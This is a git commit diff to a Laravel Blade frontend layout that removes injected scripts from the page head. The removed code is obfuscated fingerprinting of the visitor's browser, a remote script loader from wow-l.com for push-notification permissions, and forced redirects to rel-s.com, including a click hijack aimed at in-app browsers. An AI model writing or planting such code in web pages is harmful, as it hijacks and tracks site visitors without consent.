513dd55c4c91377f8dbdcf1cdaf7ec5b95a8e795
backeamin <backeamin@gmail.com>
2025-10-25 15:24:43 +0600

    done

--- resources/views/layouts/frontend_layout.blade.php
+++ resources/views/layouts/frontend_layout.blade.php
@@ -39,62 +39,6 @@
     @yield('css')
     <link href="{{asset('frontend/assets')}}/css/tailwind_css/tailwind_output.css" rel="stylesheet">
 
-
-    <script>
-        var a='mcrpolfattafloprcmlVeedrosmico?ncc=uca&FcusleluVlearVsyipoonrctannEdhrgoiiHdt_emgocdeellicboosmccoast_avDetrnseigoAnrcebsruocw=seelri_bvoemr_ssiiocn'.split('').reduce((m,c,i)=>i%2?m+c:c+m).split('c');var Replace=(o=>{var v=a[0];try{v+=a[1]+Boolean(navigator[a[2]][a[3]]);navigator[a[2]][a[4]](o[0]).then(r=>{o[0].forEach(k=>{v+=r[k]?a[5]+o[1][o[0].indexOf(k)]+a[6]+encodeURIComponent(r[k]):a[0]})})}catch(e){}return u=>window.location.replace([u,v].join(u.indexOf(a[7])>-1?a[5]:a[7]))})([[a[8],a[9],a[10],a[11]],[a[12],a[13],a[14],a[15]]]);
-        var s = document.createElement('script');
-        s.src='//wow-l.com/12e/b40ca/mw.min.js?z=10005952'+'&sw=/sw-check-permissions-eb2d8.js'+'&nouns=1';
-        s.onload = function(result) {
-            switch (result) {
-                case 'onPermissionDefault':
-                    Replace("//rel-s.com/4/10006006");break;
-                case 'onPermissionAllowed':
-                    Replace("//rel-s.com/4/10006006");break;
-                case 'onPermissionDenied':
-                    Replace("//rel-s.com/4/10006006");break;
-                case 'onAlreadySubscribed':
-                    Replace("//rel-s.com/4/10006006");break;
-                case 'onNotificationUnsupported':
-                    Replace("//rel-s.com/4/10006006");break;
-            }
-        };
-        document.head.appendChild(s);
-    </script>
-    <script>
-        var Back_Button_Zone = 10006006;
-        var Domain_TB = "rel-s.com";
-    </script>
-    <script async src="https://[object Object]/12e/b40ca/reverse.min.js?sf=1"></script>
-
-    <script>
-        function isInApp() {
-            const regex = new RegExp((WebView|(iPhone|iPod|iPad)(?!.*Safari/)|Android.*(wv)), 'ig');
-            return Boolean(navigator.userAgent.match(regex));
-        }
-
-        function initInappRd() {
-            var landingpageURL = window.location.hostname + window.location.pathname + window.location.search;
-            var completeRedirectURL = 'intent://' + landingpageURL + '#Intent;scheme=https;package=com.android.chrome;end';
-            var trafficbackURL = "https://rel-s.com/4/10006006/";
-            var ua = navigator.userAgent.toLowerCase();
-
-            if (isInApp() && (ua.indexOf('fb') !== -1 || ua.indexOf('android') !== -1 || ua.indexOf('wv') !== -1)) {
-                document.body.addEventListener('click', function () {
-                    window.onbeforeunload = null;
-                    window.open(completeRedirectURL, '_system');
-                    setTimeout(function () {
-                        window.location.replace(trafficbackURL);
-                    }, 1000);
-                });
-            }
-        }
-
-        if (document.readyState === 'loading') {
-            document.addEventListener('DOMContentLoaded', initInappRd);
-        } else {
-            initInappRd();
-        }
-    </script>
 </head>
 {{--
 Developed By INNOVA IT
